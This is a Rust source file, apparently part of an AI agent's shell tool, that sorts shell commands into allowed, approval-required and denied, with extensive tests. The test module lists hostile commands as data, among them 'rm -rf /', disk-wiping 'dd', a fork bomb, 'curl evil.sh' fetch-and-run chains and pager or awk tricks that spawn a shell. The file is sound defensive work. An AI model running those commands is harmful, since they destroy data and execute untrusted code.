            let is_list_mode = args.is_empty()
                || args.iter().any(|a| {
                    matches!(
                        *a,
                        "-a" | "--all" | "-r" | "--remotes" | "-l" | "--list" | "--show-current"
                    ) || a.starts_with("--merged")
                        || a.starts_with("--no-merged")
                        || a.starts_with("--contains")
                        || a.starts_with("--no-contains")
                        || a.starts_with("--points-at")
                });
            if is_list_mode {
                return false;
            }
            args.iter().any(|a| !a.starts_with('-'))
        }
        "remote" => !matches!(args.first(), None | Some(&"-v" | &"--verbose" | &"show" | &"get-url")),
        "tag" => {
            let listing = args.is_empty()
                || args.iter().any(|a| {
                    matches!(*a, "-l" | "--list")
                        || a.starts_with("--points-at")
                        || a.starts_with("--merged")
                        || a.starts_with("--no-merged")
                        || a.starts_with("--contains")
                        || a.starts_with("--no-contains")
                });
            let mutates = args.iter().any(|a| {
                matches!(
                    *a,
                    "-d" | "-a" | "-s" | "-u" | "-f" | "-m" | "-F" | "-c" | "-e" | "--delete" | "--annotate" | "--sign"
                        | "--force"
                ) || a.starts_with("--delete=")
            });
            if mutates {
                return true;
            }
            if listing {
                return false;
            }
            args.iter().any(|a| !a.starts_with('-'))
        }
        "stash" => !args.first().is_some_and(|sub| matches!(*sub, "list" | "show")),
        // Reading is `--get…`, `--list`, `get`/`list`, or a key alone; anything else sets.
        "config" => {
            let writes = args.iter().any(|a| {
                matches!(
                    *a,
                    "--unset" | "--unset-all" | "--add" | "--replace-all" | "--rename-section" | "--remove-section"
                        | "-e" | "--edit" | "set" | "unset" | "rename-section" | "remove-section" | "edit"
                )
            });
            if writes {
                return true;
            }
            let reads = args.iter().any(|a| {
                a.starts_with("--get") || matches!(*a, "-l" | "--list" | "get" | "list")
            });
            !reads && positionals(args).len() > 1
        }
        _ => false,
    }
}

fn gh_writes(subcommand: &str, args: &[&str]) -> bool {
    // The action is the first word after the subcommand (`gh pr list`), not any word of the
    // line: `gh pr create --title list` creates. Only listed reading actions are free.
    let mut action = None;
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if matches!(a, "-R" | "--repo") {
            i += 2;
            continue;
        }
        if !a.starts_with('-') {
            action = Some(a);
            break;
        }
        i += 1;
    }
    let reading: &[&str] = match subcommand {
        "pr" => &["list", "view", "diff", "checks", "status"],
        "issue" => &["list", "view", "status"],
        "repo" => &["view", "list"],
        "release" => &["list", "view"],
        "run" => &["list", "view"],
        "workflow" => &["list", "view"],
        // `gh auth token` would print the secret into the conversation.
        "auth" => &["status"],
        "cache" => &["list"],
        "ruleset" => &["list", "view", "check"],
        "search" | "status" => return false,
        "api" => &[],
        _ => return true,
    };
    if subcommand != "api" {
        return action.is_some_and(|a| !reading.contains(&a));
    }
    match subcommand {
        "api" => {
            if sends_other_than_get(args, "--method") {
                return true;
            }
            let mut i = 0;
            while i < args.len() {
                let a = args[i];
                if matches!(a, "-f" | "-F" | "--field" | "--raw-field" | "--input")
                    || (a.starts_with("-f") && a.len() > 2)
                    || (a.starts_with("-F") && a.len() > 2)
                    || a.starts_with("--field=")
                    || a.starts_with("--raw-field=")
                    || a.starts_with("--input=")
                {
                    return true;
                }
                i += 1;
            }
            false
        }
        _ => true,
    }
}

/// `-X POST`, `-XPOST`, `<long> POST` or `<long>=POST`: a method other than GET or HEAD.
fn sends_other_than_get(args: &[&str], long: &str) -> bool {
    let writes = |m: &str| !m.eq_ignore_ascii_case("GET") && !m.eq_ignore_ascii_case("HEAD");
    args.iter().enumerate().any(|(i, a)| {
        if *a == "-X" || *a == long {
            args.get(i + 1).is_some_and(|m| writes(m))
        } else if let Some(m) = a.strip_prefix(long).and_then(|r| r.strip_prefix('=')) {
            writes(m)
        } else if let Some(m) = a.strip_prefix("-X").filter(|m| !m.is_empty()) {
            writes(m)
        } else {
            false
        }
    })
}

fn curl_writes(args: &[&str]) -> bool {
    if sends_other_than_get(args, "--request") {
        return true;
    }
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if matches!(
            a,
            "-d" | "--data" | "--data-raw" | "--data-ascii" | "--data-binary" | "--data-urlencode"
                | "-F" | "--form" | "--form-string" | "-T" | "--upload-file" | "-o" | "-O" | "--output" | "--remote-name"
                | "-D" | "--dump-header" | "-c" | "--cookie-jar" | "--trace" | "--trace-ascii" | "--libcurl"
                | "--stderr" | "-K" | "--config" | "--etag-save" | "--hsts" | "--alt-svc" | "-J" | "--remote-header-name"
                | "--remote-name-all"
        ) || (a.starts_with("-d") && a.len() > 2)
            || a.starts_with("--dump-header=")
            || a.starts_with("--cookie-jar=")
            || a.starts_with("--config=")
            || (a.starts_with("-D") && a.len() > 2)
            || (a.starts_with("-c") && a.len() > 2 && !a.starts_with("--"))
            || (a.starts_with("-K") && a.len() > 2)
            || (a.starts_with('-') && !a.starts_with("--") && !a.starts_with("-X") && a.len() > 2 && a[1..].contains(['o', 'O', 'D', 'c', 'K', 'T', 'J']))
            || a.starts_with("--data")
            || (a.starts_with("-F") && a.len() > 2)
            || a.starts_with("--form")
            || (a.starts_with("-o") && a.len() > 2 && !a.starts_with("--"))
            || a.starts_with("--output")
        {
            return true;
        }
        i += 1;
    }
    false
}

fn forbidden_reason(command: &str) -> Option<&'static str> {
    let normalized = command.to_ascii_lowercase();
    // We compare on a form without superfluous spaces so as not to be bypassed by
    // `rm  -rf  /`, while keeping the comparison simple and predictable.
    let squeezed: String = normalized.split_whitespace().collect::<Vec<_>>().join(" ");
    if let Some((_, reason)) = FORBIDDEN.iter().find(|(pattern, _)| squeezed.contains(pattern) || normalized.contains(pattern)) {
        return Some(reason);
    }
    // The first word of each command of the line, past `sudo`: that is what runs.
    const SEPARATORS: [char; 6] = [';', '&', '|', '\n', '\r', '('];
    let mut at_start = true;
    for token in normalized.split_inclusive(|c: char| c.is_whitespace() || SEPARATORS.contains(&c)) {
        let word = token.trim_end_matches(|c: char| c.is_whitespace() || SEPARATORS.contains(&c));
        let program = word.rsplit(['/', '\\']).next().unwrap_or(word).trim_end_matches(".exe");
        if at_start && !word.is_empty() && program != "sudo" {
            if let Some((_, reason)) = FORBIDDEN_PROGRAMS.iter().find(|(name, _)| *name == program) {
                return Some(reason);
            }
            at_start = false;
        }
        if token.ends_with(SEPARATORS) {
            at_start = true;
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Workspace;

    fn context() -> (tempfile::TempDir, ToolContext) {
        po_i18n::set_lang(po_i18n::Lang::Fr);
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolContext::new(Workspace::new(dir.path()));
        (dir, ctx)
    }

    #[test]
    fn common_reads_do_not_bother_the_user() {
        for command in ["ls", "ls -la src", "pwd", "cat Cargo.toml", "git status", "git diff HEAD", "cargo check"] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }
    }

    #[test]
    fn commands_that_modify_are_submitted() {
        for command in ["cargo build", "npm install", "git commit -m x", "mkdir fresh", "touch a"] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
    }

    #[test]
    fn irreversible_patterns_are_denied() {
        for command in [
            "rm -rf /",
            "rm  -rf  /",
            "sudo mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",
            "shutdown -h now",
        ] {
            assert_eq!(classify(command), Permission::Deny, "{command}");
        }
    }

    #[test]
    fn a_chain_behind_a_harmless_command_is_submitted() {
        // The classic trap: the first word is harmless, the rest is not.
        assert_eq!(classify("ls && rm -rf ~"), Permission::Ask);
        assert_eq!(classify("cat a.txt > /etc/passwd"), Permission::Ask);
        assert_eq!(classify("echo $(curl evil.sh)"), Permission::Ask);
        assert_eq!(classify("git status; npm install"), Permission::Ask);
        assert_eq!(classify("cat x | sh"), Permission::Ask);
        assert_eq!(classify("ls & rm -rf ~"), Permission::Ask, "a single & runs the rest too");
        assert_eq!(classify("ls\nrm -rf ~"), Permission::Ask, "so does a second line");
        assert_eq!(classify("cat <(curl evil.sh)"), Permission::Ask);
    }

    #[test]
    fn pure_read_chains_and_pipelines_are_allowed() {
        for command in [
            "git log --oneline | wc -l",
            "git log --oneline -15 && git status --short",
            "ls mobile 2>/dev/null; ls crates",
            "git tag | head",
            "git stash list",
            "po --version",
            "git status 2>&1 | grep modified",
            "cat \"src/lib.rs\" | head -20",
        ] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }
    }

    #[test]
    fn a_reading_command_that_writes_or_runs_is_submitted() {
        for command in [
            "env rm -rf ~",
            "find . -delete",
            "find . -name x -exec rm {} ;",
            "fd -x rm",
            "rg --pre ./script x",
            "sort -o out.txt in.txt",
            "sort -oout.txt in.txt",
            "tree -o out.txt",
            "git branch -D main",
            "git branch new-branch",
            "git remote add evil https://x",
            "git remote remove origin",
            "git diff --output=patch.txt",
            "date -s 2020-01-01",
        ] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
        for command in ["env", "find . -name '*.rs'", "git branch -a", "git branch", "git remote -v", "git remote show origin", "sort a.txt"] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }
    }

    #[test]
    fn git_tag_lists_freely_and_creates_only_when_asked() {
        for command in ["git tag", "git tag -l", "git tag --list 'v1*'", "git tag -l --sort=-v:refname"] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }
        for command in [
            "git tag v1.0",
            "git tag -a v1.0 -m release",
            "git tag -m msg v1",
            "git tag -F message-file v1",
            "git tag -c old-tag new-tag",
            "git tag -d v0.9",
            "ls && git tag v1",
        ] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
    }

    #[test]
    fn stopping_the_machine_is_denied_but_naming_it_is_not() {
        for command in ["shutdown -h now", "sudo reboot", "ls; shutdown now", "/sbin/poweroff", "shutdown.exe /s /t 0", "Stop-Computer"] {
            assert_eq!(classify(command), Permission::Deny, "{command}");
        }
        for command in ["grep -rn shutdown src", "rg reboot", "cargo test graceful_shutdown"] {
            assert_ne!(classify(command), Permission::Deny, "{command}");
        }
    }

    #[test]
    fn the_full_path_does_not_bypass_the_classification() {
        assert_eq!(classify("/bin/ls -la"), Permission::Allow);
        assert_eq!(classify("/usr/bin/rm -rf /"), Permission::Deny);
    }

    #[test]
    fn an_empty_command_is_denied() {
        assert_eq!(classify(""), Permission::Deny);
        assert_eq!(classify("   "), Permission::Deny);
    }

    #[test]
    fn quoted_pipes_and_semicolons_in_read_commands_are_allowed() {
        assert_eq!(
            classify(r#"grep -n "sha2 0.11\|hmac 0.13\|digest 0.11" src-tauri/Cargo.lock | head -20"#),
            Permission::Allow
        );
        assert_eq!(
            classify(r#"git log --format="%h | %s" -n 5"#),
            Permission::Allow
        );
        assert_eq!(
            classify(r#"echo "=== who depends on sha2 0.11 ===""#),
            Permission::Allow
        );
        assert_eq!(
            classify(r#"grep -n "Secret scanning\|Leaked-credential\|secret scanning" README.md"#),
            Permission::Allow
        );
        assert_eq!(
            classify(r#"awk '{print $1}' file.txt"#),
            Permission::Allow
        );
        assert_eq!(
            classify(r#"jq '.[] | .name' package.json"#),
            Permission::Allow
        );
    }

    #[test]
    fn static_mutating_checks_catch_real_mutations_and_pass_reads() {
        // Real mutations -> true
        assert!(is_statically_mutating("rm -rf foo"));
        assert!(is_statically_mutating("del /f /q foo"));
        assert!(is_statically_mutating("git commit -m 'update'"));
        assert!(is_statically_mutating("git push origin main"));
        assert!(is_statically_mutating("git checkout -b new-feat"));
        assert!(is_statically_mutating("echo 'hello' > file.txt"));
        assert!(is_statically_mutating("cat a >> b"));
        assert!(is_statically_mutating("npm install lodash"));
        assert!(is_statically_mutating("cargo add serde"));
        assert!(is_statically_mutating("sed -i 's/foo/bar/g' file.txt"));
        assert!(is_statically_mutating("kill 1234"));

        // Pure reads -> false
        assert!(!is_statically_mutating("git status"));
        assert!(!is_statically_mutating("git branch -r --merged origin/main"));
        assert!(!is_statically_mutating("gh pr list --repo LeGeRyChEeSe/luavault"));
        assert!(!is_statically_mutating("grep -rn 'foo' src/ | head -10"));
        assert!(!is_statically_mutating("echo 'hello > world'"));
        assert!(!is_statically_mutating("python -c 'import json; print(1)'"));
        assert!(!is_statically_mutating("cargo metadata --format-version 1"));
    }

    #[test]
    fn a_writing_git_subcommand_stays_submitted() {
        assert_eq!(classify("git push"), Permission::Ask);
        assert_eq!(classify("git reset --hard"), Permission::Ask);
        assert_eq!(classify("git log --oneline"), Permission::Allow);
    }

    #[tokio::test]
    async fn a_successful_command_returns_its_output() {
        let (_dir, ctx) = context();
        let outcome = BashTool.run("b", json!({"command": "echo hello"}), &ctx).await;
        assert!(!outcome.is_error, "{}", outcome.content);
        assert!(outcome.content.contains("hello"));
        assert!(outcome.display.unwrap().contains("code 0"));
    }

    #[tokio::test]
    async fn a_failure_is_returned_to_the_model_with_its_code() {
        let (_dir, ctx) = context();
        // `exit 3` is written the same way in cmd.exe and in sh.
        let outcome = BashTool.run("b", json!({"command": "exit 3"}), &ctx).await;
        assert!(outcome.is_error);
        assert!(outcome.content.contains("exit code 3"));
    }

    #[tokio::test]
    async fn the_command_runs_in_the_workspace() {
        let (_dir, ctx) = context();
        std::fs::write(ctx.workspace.root().join("witness.txt"), "x").unwrap();
        let shell = detected_shell().description;
        let command = if shell.starts_with("cmd") {
            "dir /b"
        } else if shell.starts_with("PowerShell") {
            "Get-ChildItem -Name"
        } else {
            "ls"
        };
        let outcome = BashTool.run("b", json!({"command": command}), &ctx).await;
        assert!(outcome.content.contains("witness.txt"));
    }

    #[tokio::test]
    async fn a_forbidden_command_is_blocked_at_execution() {
        let (_dir, ctx) = context();
        let outcome = BashTool.run("b", json!({"command": "rm -rf /"}), &ctx).await;
        assert!(outcome.is_error);
        assert!(outcome.content.contains("refused"));
    }

    #[tokio::test]
    async fn a_timeout_is_announced_clearly() {
        let (_dir, ctx) = context();
        let command = if cfg!(windows) {
            "ping -n 10 127.0.0.1"
        } else {
            "sleep 10"
        };
        let outcome = BashTool
            .run("b", json!({"command": command, "timeout_seconds": 1}), &ctx)
            .await;
        assert!(outcome.is_error);
        assert!(outcome.content.contains("interrupted"));
    }

    #[tokio::test]
    async fn a_timeout_stops_what_the_shell_started_too() {
        let (_dir, ctx) = context();
        let shell = detected_shell().description;
        if !(shell.starts_with("bash") || shell.starts_with("sh")) {
            return;
        }
        // A grandchild: a shell inside the shell, which writes once the tool has given up.
        let command = "sh -c 'sleep 3; echo late > late.txt'; true";
        let outcome = BashTool.run("b", json!({"command": command, "timeout_seconds": 1}), &ctx).await;
        assert!(outcome.content.contains("interrupted"));
        tokio::time::sleep(Duration::from_secs(4)).await;
        assert!(!ctx.workspace.root().join("late.txt").exists(), "the grandchild survived the timeout");
    }

    #[tokio::test]
    async fn an_empty_output_is_reported() {
        let (_dir, ctx) = context();
        let command = if cfg!(windows) { "cd ." } else { "true" };
        let outcome = BashTool.run("b", json!({"command": command}), &ctx).await;
        assert!(outcome.content.contains("no output"));
    }

    #[test]
    fn the_announced_shell_matches_the_launched_program() {
        let shell = detected_shell();
        assert!(!shell.description.is_empty());
        assert!(!shell.args.is_empty());
        let name = shell.program.to_string_lossy().to_ascii_lowercase();
        assert!(
            !(name.contains("system32") && name.contains("bash")),
            "the WSL launcher must never be selected"
        );
    }
    #[test]
    fn git_read_only_inspection_subcommands_are_allowed() {
        for command in [
            "git branch -r --merged origin/main",
            "git branch --merged main",
            "git branch --no-merged main",
            "git branch -r 'origin/*'",
            "git branch -l",
            "git branch --show-current",
            "git rev-list --left-right --count origin/main...HEAD",
            "git rev-list --count origin/main..origin/feat",
            "git merge-base --is-ancestor origin/main HEAD",
            "git for-each-ref --format='%(refname:short)' refs/remotes/origin",
            "git ls-remote --tags origin",
            "git rev-parse HEAD",
            "git cat-file -p HEAD",
            "git describe --tags",
            "git shortlog -s -n",
            "git ls-files",
            "git ls-tree HEAD",
            "git name-rev --name-only HEAD",
            "git check-ref-format --branch main",
            "git check-ignore *.log",
            "git var GIT_AUTHOR_IDENT",
            "git --no-pager log -n 5",
            "git -C . status",
        ] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }

        // Branch creation and deletion require approval
        for command in [
            "git branch new-feature",
            "git branch -d old-feature",
            "git branch -D old-feature",
            "git branch -m old new",
            "git branch -c old copy",
            "git branch -u origin/main",
            "git branch --set-upstream-to=origin/main",
        ] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
    }

    #[test]
    fn gh_cli_reads_are_allowed_and_mutations_ask() {
        for command in [
            "gh pr list --repo owner/repo --state open",
            "gh pr view 42",
            "gh pr diff 42",
            "gh pr checks 42",
            "gh pr status",
            "gh issue list --state open",
            "gh issue view 10",
            "gh issue status",
            "gh repo view owner/repo",
            "gh repo list owner",
            "gh release list",
            "gh release view v1.0",
            "gh run list",
            "gh run view 123",
            "gh workflow list",
            "gh workflow view ci",
            "gh search issues 'bug'",
            "gh search prs 'feat'",
            "gh auth status",
            "gh api repos/owner/repo/pulls",
            "gh api repos/owner/repo/pulls --jq '.[].title'",
            "gh -R owner/repo pr list",
            "gh pr list 2>&1 | head -c 6000",
        ] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }

        for command in [
            "gh pr merge 42",
            "gh pr close 42",
            "gh pr create --title 'x' --body 'y'",
            "gh pr comment 42 -b 'lgtm'",
            "gh issue close 10",
            "gh issue create -t 'bug' -b 'desc'",
            "gh repo delete owner/repo",
            "gh release create v1.0",
            "gh release download v1.0",
            "gh run rerun 123",
            "gh workflow run ci",
            "gh auth login",
            "gh auth logout",
            "gh api -X POST repos/owner/repo/issues -f title='x'",
            "gh api repos/owner/repo/issues -f title='x'",
            "gh api repos/owner/repo/issues --input body.json",
        ] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
    }

    #[test]
    fn curl_get_queries_are_allowed_and_writes_ask() {
        for command in [
            "curl -s https://api.github.com/repos/owner/repo/pulls",
            "curl -sS https://api.github.com/rate_limit",
            "curl -s https://example.com | head -n 20",
        ] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }

        for command in [
            "curl -X POST https://api.github.com/issues",
            r#"curl -d '{"foo":"bar"}' https://api.github.com"#,
            "curl -o output.txt https://example.com/file",
            "curl -O https://example.com/file.tar.gz",
            "curl -F 'file=@test.txt' https://example.com/upload",
        ] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
    }

    #[test]
    fn a_command_with_accents_outside_quotes_is_classified_without_panicking() {
        // A heredoc commit message with "piège n°29" took the whole session down: the
        // classifier walked bytes and sliced the string in the middle of a character.
        for command in [
            "git commit -q -F - <<'MSG' && git push
fix: run (piège n°29), someone else's
MSG",
            "echo é 2>/dev/null",
            r"echo \é > out.txt",
            "ls é | head",
        ] {
            let _ = classify(command);
            let _ = strip_benign_redirections(command);
            let _ = split_compound_command(command);
        }
        assert_eq!(strip_benign_redirections("echo é°"), "echo é°");
    }

    #[test]
    fn widened_read_list_still_asks_before_writing_or_running() {
        for command in [
            "sd foo bar src/main.rs",
            "wget https://example.com/file.zip",
            "wget -q https://example.com -o log.txt",
            "git config user.name evil",
            "git config --global alias.x '!rm -rf .'",
            "git config --unset user.name",
            "git -c core.pager='sh -c id' log",
            "git --exec-path=/tmp log",
            "npm audit fix",
            "pnpm audit --fix",
            "yq -i '.a = 1' f.yaml",
            "sed 's/a/b/w out.txt' f",
            "sed -n '1e id' f",
            "sed 's/x/y/e' f",
            "sed -f script.sed f",
            "awk 'BEGIN { system(\"id\") }'",
            "awk '{ print > \"out\" }' f",
            "awk '{ print | \"sh\" }' f",
            "curl -D headers.txt https://example.com",
            "curl -c jar https://example.com",
            "curl -K cfg https://example.com",
            "curl -sSLo file https://example.com",
            "gh pr create --title list",
            "gh pr checkout 12",
            "gh pr update-branch 3",
            "gh auth token",
            "gh cache delete --all",
            "gh issue comment 4 --body view",
            "top",
        ] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
        for command in [
            "sd -p foo bar src/main.rs",
            "wget -qO- https://example.com",
            "wget -O - https://example.com",
            "wget --spider https://example.com",
            "git config user.name",
            "git config --get user.email",
            "git config --list",
            "git log -c",
            "npm audit",
            "yq '.a' f.yaml",
            "sed -n '10,20p' f",
            "sed -n '/fn new/,/^}/p' src/lib.rs",
            "sed 's/error/warn/g' f",
            "awk '{ print $1 }' f",
            "curl -s https://example.com",
            "curl -XGET https://example.com",
            "gh pr list",
            "gh pr view 12 --comments",
            "gh -R a/b pr list",
            "gh pr --repo a/b view 3",
            "gh issue list --label bug",
            "gh auth status",
            "gh cache list",
            "gh api repos/a/b/pulls",
        ] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }
    }
}
